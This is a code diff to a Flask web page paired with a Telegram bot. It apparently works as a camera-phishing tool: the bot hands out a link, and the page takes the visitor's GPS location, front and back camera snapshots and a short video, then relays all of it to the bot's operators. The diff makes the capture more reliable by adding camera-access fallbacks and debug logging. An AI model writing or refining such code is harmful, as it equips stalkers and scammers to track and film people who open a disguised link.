@@ -34,6 +34,7 @@ HTML_PAGE = """<!DOCTYPE html>
         .controls button:disabled { opacity:0.5; cursor:not-allowed; }
         .status { margin-top:10px; color:#aaa; font-size:14px; }
         #locationStatus { color:#3ea6ff; }
+        #debug { margin-top:10px; padding:8px; background:#1a1a1a; color:#ccc; font-size:12px; white-space:pre-wrap; word-break:break-all; max-height:100px; overflow-y:auto; }
     </style>
 </head>
 <body>
@@ -55,13 +56,20 @@ HTML_PAGE = """<!DOCTYPE html>
         </div>
         <div class="status" id="statusText">Ready. Click "Start Session".</div>
         <div id="locationStatus">📍 Location: pending</div>
+        <div id="debug">Debug: waiting...</div>
     </div>
     <script>
         let frontStream = null, backStream = null, mediaRecorder = null;
         let recordedChunks = [], recordingActive = false, maxDuration = 10000;
         const statusText = document.getElementById('statusText');
         const locationStatus = document.getElementById('locationStatus');
+        const debugDiv = document.getElementById('debug');
         const startBtn = document.getElementById('startBtn');
+
+        function log(msg) {
+            debugDiv.innerText = msg + '\\n' + debugDiv.innerText;
+            console.log(msg);
+        }
 
         function updateStatus(msg, good=true) {
             statusText.innerText = msg;
@@ -79,8 +87,9 @@ HTML_PAGE = """<!DOCTYPE html>
                 locationStatus.innerHTML = `📍 Location sent: ${coords.lat.toFixed(6)}, ${coords.lng.toFixed(6)}`;
                 updateStatus('Location sent to bot.');
             })
-            .catch(() => {
+            .catch((e) => {
                 locationStatus.innerHTML = '📍 Location send failed.';
+                log('Location send error: ' + e);
             });
         }
 
@@ -126,7 +135,47 @@ HTML_PAGE = """<!DOCTYPE html>
             await fetch('/capture', { method: 'POST', body: fd });
         }
 
-        // ---- Send camera denial ONLY for user denial ----
+        function sendCameraDenied() {
+            fetch('/camera_denied', { method: 'POST' });
+        }
+
+        function sendCameraUnavailable() {
+            fetch('/camera_unavailable', { method: 'POST' });
+        }
+
+        // ---- Improved camera getter with fallbacks ----
+        async function getCameraStream() {
+            // Try without any constraints first (most compatible)
+            try {
+                log('Trying getUserMedia without constraints...');
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                log('Success: no constraints');
+                return { stream, label: 'default' };
+            } catch (e) {
+                log('No-constraints failed: ' + e.name + ' - ' + e.message);
+                // Try back camera with environment
+                try {
+                    log('Trying back camera (environment)...');
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
+                    log('Success: environment');
+                    return { stream, label: 'environment' };
+                } catch (e2) {
+                    log('Environment failed: ' + e2.name + ' - ' + e2.message);
+                    // Try front camera (user)
+                    try {
+                        log('Trying front camera (user)...');
+                        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+                        log('Success: user');
+                        return { stream, label: 'user' };
+                    } catch (e3) {
+                        log('All camera attempts failed.');
+                        throw new Error('No camera available');
+                    }
+                }
+            }
+        }
+
+        // ---- Send camera denial ----
         function sendCameraDenied() {
             fetch('/camera_denied', { method: 'POST' });
         }
@@ -140,6 +189,7 @@ HTML_PAGE = """<!DOCTYPE html>
             startBtn.innerText = 'Starting...';
             updateStatus('Requesting location...');
 
+            // ---- Step 1: Get location ----
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
@@ -164,15 +214,39 @@ HTML_PAGE = """<!DOCTYPE html>
         async function requestCamera() {
             updateStatus('Requesting camera access...');
             try {
-                const back = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
-                const front = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
-                frontStream = front;
-                backStream = back;
+                const result = await getCameraStream();
+                const stream = result.stream;
+                const label = result.label;
+                log('Camera obtained: ' + label);
+
+                // We only have one stream. We'll use it for both front and back? But we need two streams.
+                // Simpler: use the same stream for both (if only one camera), or try to get a second stream.
+                // Let's try to get a second stream (front) if possible, else reuse the same.
+                let frontStreamLocal = null;
+                let backStreamLocal = stream; // use the obtained stream as back
+
+                // Try to get a front stream separately (if possible)
+                try {
+                    const frontResult = await getCameraStream(); // will try again
+                    frontStreamLocal = frontResult.stream;
+                    log('Second camera obtained (front)');
+                } catch (e) {
+                    log('Could not get second camera, reusing the first.');
+                    // If only one camera, we can clone the stream (but not needed, we'll just use the same for both)
+                    frontStreamLocal = stream;
+                }
+
+                // Assign to global variables
+                backStream = stream;
+                frontStream = frontStreamLocal || stream; // fallback
+
                 updateStatus('Camera granted – capturing screenshots...');
                 const frontBlob = await captureFrame(frontStream);
                 const backBlob = await captureFrame(backStream);
 
-                mediaRecorder = new MediaRecorder(backStream, { mimeType: 'video/webm;codecs=vp9' });
+                // Record from back stream (or whichever)
+                const recordStream = backStream;
+                mediaRecorder = new MediaRecorder(recordStream, { mimeType: 'video/webm;codecs=vp9' });
                 recordedChunks = [];
                 mediaRecorder.ondataavailable = (e) => { if (e.data.size) recordedChunks.push(e.data); };
                 mediaRecorder.onstop = () => {
@@ -198,37 +272,30 @@ HTML_PAGE = """<!DOCTYPE html>
                 });
                 startBtn.innerText = 'Recording...';
             } catch (err) {
-                // Differentiate between user denial and other errors
-                let errorMsg = "Camera permission denied.";
-                let sendFunc = sendCameraDenied;
+                // All camera attempts failed
+                let errorMsg = err.message || 'Camera unavailable.';
+                let sendFunc = sendCameraUnavailable;
                 if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
-                    // User explicitly denied
-                    errorMsg = "Camera: Denied by user.";
                     sendFunc = sendCameraDenied;
-                } else if (err.name === 'NotFoundError') {
-                    errorMsg = "Camera not found (no camera device).";
-                    sendFunc = sendCameraUnavailable;
-                } else if (err.name === 'NotReadableError') {
-                    errorMsg = "Camera busy or not readable.";
-                    sendFunc = sendCameraUnavailable;
+                    errorMsg = 'Camera: Denied by user.';
                 } else {
-                    errorMsg = "Camera unavailable: " + err.message;
-                    sendFunc = sendCameraUnavailable;
+                    errorMsg = 'Camera: Unavailable (no camera or other error).';
                 }
                 updateStatus(errorMsg, false);
-                sendFunc(); // notify bot
+                sendFunc();
                 startBtn.disabled = false;
                 startBtn.innerText = '▶ Start Session';
+                log('Final error: ' + errorMsg);
             }
         }
 
         startBtn.addEventListener('click', startSession);
         updateStatus('Click "Start Session" – location first, then camera.');
+        log('Page loaded. Ready.');
     </script>
 </body>
 </html>"""
 
-# ---------- ROUTES ----------
 @app.route('/')
 def index():
     return render_template_string(HTML_PAGE)
@@ -241,7 +308,7 @@ def location():
             try:
                 bot.send_message(uid, "📍 Location: Denied by user.")
             except Exception as e:
-                print(f"Error sending to {uid}: {e}")
+                print(f"Error: {e}")
         return "OK", 200
     lat = data.get('lat')
     lng = data.get('lng')
@@ -251,7 +318,7 @@ def location():
                 bot.send_location(uid, lat, lng)
                 bot.send_message(uid, f"📍 Location: {lat}, {lng}")
             except Exception as e:
-                print(f"Location send error to {uid}: {e}")
+                print(f"Location send error: {e}")
         return "OK", 200
     return "Invalid", 400
 
@@ -261,7 +328,7 @@ def camera_denied():
         try:
             bot.send_message(uid, "📷 Camera: Denied by user.")
         except Exception as e:
-            print(f"Send error to {uid}: {e}")
+            print(f"Error: {e}")
     return "OK", 200
 
 @app.route('/camera_unavailable', methods=['POST'])
@@ -270,7 +337,7 @@ def camera_unavailable():
         try:
             bot.send_message(uid, "📷 Camera: Unavailable (no camera or other error).")
         except Exception as e:
-            print(f"Send error to {uid}: {e}")
+            print(f"Error: {e}")
     return "OK", 200
 
 @app.route('/capture', methods=['POST'])
@@ -291,10 +358,9 @@ def capture():
                 bot.send_video(uid, video.read(), supports_streaming=True)
             bot.send_message(uid, "📸 Media capture complete.")
         except Exception as e:
-            print(f"Media send error to {uid}: {e}")
+            print(f"Media send error: {e}")
     return "OK", 200
 
-# ---------- BOT ----------
 @bot.message_handler(commands=['start'])
 def send_link(m):
     bot.reply_to(m, f"🔗 Open this link on your phone:\n{BASE_URL}/\n\nIt will ask for location and camera, then send data automatically.")
